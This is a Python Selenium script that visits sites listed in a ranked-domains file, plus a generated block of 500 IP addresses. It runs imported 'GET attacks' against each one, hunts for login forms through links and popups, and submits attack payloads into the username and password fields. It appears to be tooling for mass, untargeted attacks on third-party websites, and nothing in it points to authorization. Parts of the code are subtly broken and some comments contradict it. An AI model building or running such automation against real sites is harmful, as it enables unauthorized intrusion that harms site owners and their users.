from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import json
import time
import socket
from dotenv import load_dotenv
import os
import mysql.connector
from urllib.parse import urljoin, urlparse
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, StaleElementReferenceException,NoSuchElementException
import csv


#Code Dependencies 
from utils.network_traffic_post import *
from utils.network_traffic_get import *

#Load Credentials from .env 
load_dotenv()


#Set up Chrome options and capabilities for enabling network traffic capturing
chrome_options = Options()
chrome_options.add_argument("--start-maximized")  # Open browser in maximized mode
chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
chrome_options.add_argument('--ignore-certificate-errors')

# Specify the path to chromedriver
chromedriver_path = os.getenv('CHROMEDRIVER_PATH')  # Replace with your chromedriver path
service = Service(chromedriver_path)

# Initialize WebDriver
driver = webdriver.Chrome(service=service, options=chrome_options)

# Define a function to find login elements dynamically
def find_login_elements(driver):
    # Common locators to try for username and password fields
    locators = [
        {'username': (By.NAME, 'username'), 'password': (By.NAME, 'password')},
        {'username': (By.ID, 'username'), 'password': (By.ID, 'password')},
        {'username': (By.CSS_SELECTOR, 'input[name="username"]'), 'password': (By.CSS_SELECTOR, 'input[name="password"]')},
        {'username': (By.CSS_SELECTOR, 'input[type="text"]'), 'password': (By.CSS_SELECTOR, 'input[type="password"]')},
        {'username': (By.CSS_SELECTOR, 'input[type="email"]'), 'password': (By.CSS_SELECTOR, 'input[type="password"]')},
        {'username': (By.XPATH, '//input[@name="username"]'), 'password': (By.XPATH, '//input[@name="password"]')},
        {'username': (By.XPATH, '//input[@placeholder="Enter your username"]'), 'password': (By.XPATH, '//input[@type="password"]')},
        {'username': (By.XPATH, '//input[@placeholder="username"]'), 'password': (By.XPATH, '//input[@placeholder="password"]')},
        {'username': (By.XPATH, '//input[@placeholder="Username"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')},
        {'username': (By.XPATH, '//input[@placeholder="Email"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')}
        
    ]

    # Try each locator set
    for locator in locators:
        try:
            username_field = driver.find_element(*locator['username'])
            password_field = driver.find_element(*locator['password'])
            return username_field, password_field
        except:
            pass
    return None, None

def find_internal_links(driver, base_url):
    try:
        # Wait until all anchor tags are loaded
        WebDriverWait(driver, 35).until(EC.presence_of_all_elements_located((By.TAG_NAME, 'a')))
        
        # Parse base URL
        parsed_base_url = urlparse(base_url)
        base_netloc = parsed_base_url.netloc.replace("www.", "")  # Remove 'www' for comparison
        
        links = driver.find_elements(By.TAG_NAME, 'a')
        internal_links = []
        
        for link in links:
            href = link.get_attribute('href')
            
            if href:
                parsed_href = urlparse(href)
                href_netloc = parsed_href.netloc.replace("www.", "")  # Remove 'www' for comparison
                
                # Handle relative URLs
                if not parsed_href.netloc:
                    href = urljoin(base_url, href)
                
                # Check if it's an internal link (same domain or subdomain)
                if base_netloc in href_netloc:
                    # Identify potential login/account links based on common keywords
                    if any(keyword in href.lower() for keyword in ['login', 'sign in', 'signin', 'accountcenter', 'account', 'secure']):
                        internal_links.append(href)
        
        print("Filtered internal links (with 'login', 'sign in', or related keywords):", internal_links)
        return internal_links
    
    except Exception as e:
        print(f"Error finding internal links: {e}")
        return []

def handle_login_popup(driver):
    # Define common locators for popups/modals
    popup_locators = [
        By.CSS_SELECTOR, '.modal',  # General modal class
        By.CSS_SELECTOR, '.popup',  # General popup class
        By.CSS_SELECTOR, '#preloginModal',  # Specific ID for known modal
        By.CSS_SELECTOR, '.login-modal',  # Example of a custom class
        By.CSS_SELECTOR, '.signin-popup',  # Example of another class
    ]

    for locator in popup_locators:
        try:
            # Wait for the popup to be visible
            WebDriverWait(driver, 15).until(EC.visibility_of_element_located(locator))
            
            # Find the popup element
            popup = driver.find_element(*locator)
            print(f"Popup found with locator: {locator}")

            # Optional: Switch to iframe if the popup is inside one
            # if driver.find_elements(By.TAG_NAME, 'iframe'):
            #     driver.switch_to.frame(driver.find_element(By.TAG_NAME, 'iframe'))

            # Find and return the login elements within the popup
            username_field, password_field = find_login_elements(driver)
            if username_field and password_field:
                return username_field, password_field

        except Exception as e:
            print(f"Error handling popup with locator {locator}: {e}")
    
    print("No recognized popup found.")
    return None, None



def navigate_to_login_page(driver, base_url):
    internal_links = find_internal_links(driver, base_url)
    print("internal links:",internal_links)
    for link in internal_links:
        driver.get(link)
        username_field, password_field = find_login_elements(driver)
        if username_field and password_field:
            return username_field, password_field
    return None, None


def generate_ip_list(count):
    ip_set = set()
    start_ip = (129 << 24)  # Start from 128.0.0.0
    for i in range(start_ip, start_ip + count):
        # Calculate each octet
        octet1 = (i >> 24) & 0xFF
        octet2 = (i >> 16) & 0xFF
        octet3 = (i >> 8) & 0xFF
        octet4 = i & 0xFF
        ip_set.add(f"{octet1}.{octet2}.{octet3}.{octet4}")
    return ip_set

# Generate a set of 10 sequential IP addresses (you can adjust the count)
ip_set = generate_ip_list(500)
ip_list = list(ip_set)


def find_login_page(driver):
    login_button_xpaths = [
        '//a[contains(text(), "Login") or contains(text(), "Sign In") or contains(text(), "login")]',
        '//button[contains(text(), "Login") or contains(text(), "Sign In")]',
        '//input[@type="button" or @type="submit" and (contains(@value, "Login") or contains(@value, "Sign In"))]'
    ]
    

    for xpath in login_button_xpaths:
        try:
            login_button = driver.find_element(By.XPATH, xpath)
            login_button.click()
            # Wait for the page to load after clicking the login button
            WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.ID, 'username'))
            )
            username_field = driver.find_element(By.ID, 'username')
            password_field = driver.find_element(By.ID, 'password')
            if username_field and password_field:
                return username_field, password_field
        except NoSuchElementException:
            continue
        except TimeoutException:
            continue
    return None, None


def process_ip(ip):
    target_url = f"http://{ip}"  # Access each IP over HTTPS
    print(f"Visiting: {target_url}")

    # Initialize a new WebDriver instance (new browser window) for each IP
    driver = webdriver.Chrome(service=service, options=chrome_options)

    try:
        driver.set_page_load_timeout(30)  # Set timeout for page load
        driver.get(target_url)

        # Allow time for the base page to load
        time.sleep(5)

        #Perform GET attacks
        perform_get_attacks(driver, target_url)

        # Step 1: Check if the base URL itself is a login page
        username_field, password_field = find_login_elements(driver)
       
        #print("Username Field HTML:", username_field.get_attribute('outerHTML'))
        #print("Username Field HTML:", password_field.get_attribute('outerHTML'))
       
        
        if username_field and password_field:
            print("Base URL is a login page. Proceeding to submit payloads...")
            # Submit payloads to the login form
            submit_payloads(driver, username_field, password_field)
            username_field, password_field = handle_login_popup(driver)
            submit_payloads(driver, username_field, password_field)
        else:
            # Step 2: If not, find internal links (including login or signin links)
            internal_links = find_internal_links(driver, target_url)
            print(f"Internal links found: {internal_links}")
            
            # Filter and navigate to login/signin links
            login_links = [link for link in internal_links if any(keyword in link.lower() for keyword in ['login', 'signin', 'accountcenter', 'account', 'manage', 'subscription', 'secure'])]
            
            if login_links:
                login_url = login_links[0]  # Take the first found login link
                print(f"Navigating to login page: {login_url}")
                driver.get(login_url)

                # Allow time for the login page to load
                time.sleep(5)

                # Try to find login elements on the login page
                username_field, password_field = find_login_elements(driver)

                if username_field and password_field:
                    print("Login page found. Proceeding to submit payloads...")
                    submit_payloads(driver, username_field, password_field)
                else:
                    
                    # Handle potential popups/modal dialogs if login fields are not directly found
                    print("Login elements not found on the login page. Checking for popups/modal dialogs...")
                    username_field, password_field = handle_login_popup(driver)
                    #Submit payloads to the login form
                    submit_payloads(driver, username_field, password_field)
            else:
                print("No login/signin links found on the page.")

    except TimeoutException:
        print(f"Timed out after 30 seconds for {target_url}")
    except Exception as e:
        print(f"Failed to load {target_url}: {e}")
    except StaleElementReferenceException:
        driver.refresh()
        # Re-locate elements and retry the operation
        login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
                        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
                                   '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
                    ))
        login_button.click()
    finally:
        driver.quit()  # Close the browser window


# Process each IP address
# Read the CSV file and process each domain
with open('ranked_domains.csv', newline='') as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        domain = row['Domain']
        process_ip(domain)
        time.sleep(20)
